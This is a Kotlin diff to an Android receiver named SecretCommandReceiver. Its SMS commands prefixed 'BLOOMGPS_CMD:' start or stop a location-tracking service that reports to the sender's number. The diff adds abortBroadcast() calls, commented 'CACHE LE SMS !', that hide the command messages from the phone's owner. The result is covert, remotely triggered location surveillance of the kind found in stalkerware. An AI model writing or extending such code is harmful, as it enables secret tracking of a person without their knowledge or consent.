@@ -17,10 +17,10 @@ class SecretCommandReceiver : BroadcastReceiver() {
             SmsMessage.createFromPdu(pdus[0] as ByteArray)
         }
         
-        val port = intent.extras?.getInt("port", 0) ?: 0
-        if (port != 10002) return
+        val corps = message.messageBody ?: return
+        if (!corps.startsWith("BLOOMGPS_CMD:")) return
         
-        val commande = message.messageBody?.trim() ?: return
+        val commande = corps.removePrefix("BLOOMGPS_CMD:").trim()
         val serviceIntent = Intent(context, LocationTrackerService::class.java).apply {
             putExtra("commande", commande)
             putExtra("numero_dest", message.originatingAddress)
@@ -29,8 +29,10 @@ class SecretCommandReceiver : BroadcastReceiver() {
         if (commande == "START") {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(serviceIntent)
             else context.startService(serviceIntent)
+            abortBroadcast() // ✅ CACHE LE SMS !
         } else if (commande == "STOP") {
             context.startService(serviceIntent)
+            abortBroadcast() // ✅ CACHE LE SMS !
         }
     }
 }
